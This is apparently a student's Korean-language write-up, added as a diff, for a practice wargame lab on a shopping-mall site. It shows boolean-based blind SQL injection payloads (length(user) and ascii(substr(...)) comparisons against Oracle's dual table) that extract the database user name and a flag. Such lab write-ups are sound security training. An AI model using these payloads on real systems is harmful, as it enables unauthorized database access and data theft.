@@ -1,0 +1,50 @@
+과제 내용
+
+========================================
+
+* 쇼핑몰 워게임 문제 1번 - 매너리즘 타파!
+
+========================================
+
+1. 풀이과정
+1. 쿼리문 유추
+select 컬림들 from 상품목록 where 상품명 like '%__검색어__%' 에러가 나지않음 (X)
+
+https://lab.eqst.co.kr:8110/practice/practice01/detail?id=62
+
+2. 공격포인트
+' -> 
+검색어 : id=62 and 1=1 -> 결과값이 나옴
+검색어 : id=62 and 1=2 -> 결과값이 나오지않음
+참과 거짓이 구분이 된다. 취약함
+
+https://lab.eqst.co.kr:8110/practice/practice01/detail?id=62
+and (select length(user) from dual) >=7 and 1=1
+and (select length(user) from dual) >=8 and 1=1
+
+user명 개수는 8개이다.
+
+3. user명 뽑기
+and (select ascii(substr(user,1,1)) from dual) > 80 and 1=1 -> true
+and (select ascii(substr(user,1,1)) from dual) > 90 and 1=1 -> false
+
+and (select ascii(substr(user,2,1)) from dual) > 80 and 1=1 -> true
+and (select ascii(substr(user,2,1)) from dual) > 85 and 1=1 -> false
+and (select ascii(substr(user,3,1)) from dual) =69 and 1=1
+
+and (select ascii(substr(user,4,1)) from dual) 87 and 1=1
+이후로 계속 넣어보면서 답을 구함.
+85
+83
+69
+87
+79
+82
+76
+68
+
+2. 정답
+user명 : USEWORLD
+Flag : user_is_my_nickname
+
+========================================
